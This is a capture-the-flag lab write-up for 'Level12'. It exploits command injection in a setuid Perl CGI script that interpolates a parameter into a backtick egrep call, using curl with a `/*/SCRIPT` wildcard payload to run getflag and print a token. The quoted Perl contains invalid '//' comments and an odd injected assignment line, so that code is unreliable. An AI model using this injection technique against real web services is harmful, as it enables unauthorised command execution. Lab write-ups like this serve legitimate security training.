# Level12
## substitution commands linux
```bash
ls -la
# Output, Another perl script, gonna read it
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
cat level12.pl
```

```pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1]; // y
  $xx = $_[0]; // x
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  $xx="\" /tmp/xd ; echo hell > ls"\"
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")))
```
```bash
curl localhost:4646?x=token\&y=/tmp/xd
--> n(t(x=token, y=/tmp/xd))
--> xx = TOKEN
--> egrep "^TOKEN" /tmp/xd 2>&1
--> egrep: /tmp/xd: No such file or directory
--> egrep, /tmp/xd
--> /tmp/xd == y
```
We can inject our command on this one `egrep "^$xx" /tmp/xd 2>&1` using substitution commands linux<br>
We have to be carefull because the prgram does replace the lower case with the upper case, in this case<br>
we are gonona change this behavior by using /\*/SCRIPT<br>
In Linux you can access files within directories just by doing this /\*/\*/\*/your_file
```bash
echo "getflag > /tmp/flag" > /tmp/SCRIPT
chmod +x /tmp/SCRIPT
curl localhost:4646?x='`/*/SCRIPT`'
cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

[perl_regex](https://perldoc.perl.org/perlre)